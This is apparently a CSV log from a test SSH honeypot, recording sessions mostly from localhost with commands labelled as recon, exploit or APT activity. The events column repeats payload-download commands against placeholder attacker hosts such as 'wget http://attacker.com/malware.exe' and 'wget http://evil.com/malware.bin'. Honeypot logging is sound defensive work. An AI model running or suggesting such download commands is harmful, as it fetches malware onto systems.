session_id,src_ip,src_port,timestamp,events,dst_port,instance,attack_type,src_country
S-1762444442,127.0.0.1,50923,2025-11-06 21:24:02,uname -a,2222,default,recon,LOCAL
S-1762444589,127.0.0.1,52051,2025-11-06 21:26:29,uname -a,2222,default,recon,LOCAL
S-1762450397,127.0.0.1,64216,2025-11-06 23:03:17,wget http://malicious.example/x | ls -la,2222,default,exploit,LOCAL
S-1762454985,127.0.0.1,57182,2025-11-07 00:19:46,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762455958,127.0.0.1,53734,2025-11-07 00:36:00,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762502340,127.0.0.1,50692,2025-11-07 13:29:02,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762503072,127.0.0.1,59319,2025-11-07 13:41:14,wget http://malicious.example/x,2222,default,exploit,LOCAL
S-1762503846,127.0.0.1,58022,2025-11-07 13:54:07,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762504483,127.0.0.1,54140,2025-11-07 14:04:44,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762597591,127.0.0.1,60336,2025-11-08 15:56:32,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762602185,127.0.0.1,60502,2025-11-08 17:13:06,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762626543,127.0.0.1,51498,2025-11-08 23:59:04,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762627149,127.0.0.1,50178,2025-11-09 00:09:10,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,exploit,LOCAL
S-1762776952,127.0.0.1,61024,2025-11-10 17:45:55,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,recon,LOCAL
S-1762797098,127.0.0.1,57713,2025-11-10 23:21:41,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,recon,LOCAL
S-1762797430,127.0.0.1,55184,2025-11-10 23:27:12,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,recon,LOCAL
S-1767861160,127.0.0.1,54971,2026-01-08 14:02:41,wget http://malicious.example/x | ðŸ”´ CMD: ls -la,2222,default,recon,LOCAL
S-1767939702,203.0.113.42,54321,2026-01-09 06:21:42,SSH-2.0-OpenSSH_7.4 | root@192.168.1.1 | wget http://evil.com/malware.bin,2222,honeypot-primary,apt,UNKNOWN
S-1767940127,127.0.0.1,64330,2026-01-09 11:58:47,Connection events only,2222,default,unknown,LOCAL
S-1767940128,127.0.0.1,64331,2026-01-09 11:58:48,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1767942088,127.0.0.1,62544,2026-01-09 12:31:28,Connection events only,2222,default,unknown,LOCAL
S-1767942089,127.0.0.1,50287,2026-01-09 12:31:29,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1768121800,127.0.0.1,54028,2026-01-11 14:26:41,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1768932661,127.0.0.1,65251,2026-01-20 23:41:02,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1768932878,127.0.0.1,51072,2026-01-20 23:44:38,Connection events only,2222,default,unknown,LOCAL
S-1768932879,127.0.0.1,51073,2026-01-20 23:44:39,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1768933303,127.0.0.1,58044,2026-01-20 23:51:44,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1768933348,127.0.0.1,60691,2026-01-20 23:52:29,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1769709063,127.0.0.1,58397,2026-01-29 23:21:04,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1770355901,127.0.0.1,55771,2026-02-06 11:01:41,Connection events only,2222,default,unknown,LOCAL
S-1770355902,127.0.0.1,55775,2026-02-06 11:01:42,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
S-1770537908,127.0.0.1,51134,2026-02-08 13:35:08,Connection events only,2222,default,unknown,LOCAL
S-1770537909,127.0.0.1,51135,2026-02-08 13:35:10,wget http://attacker.com/malware.exe,2222,default,recon,LOCAL
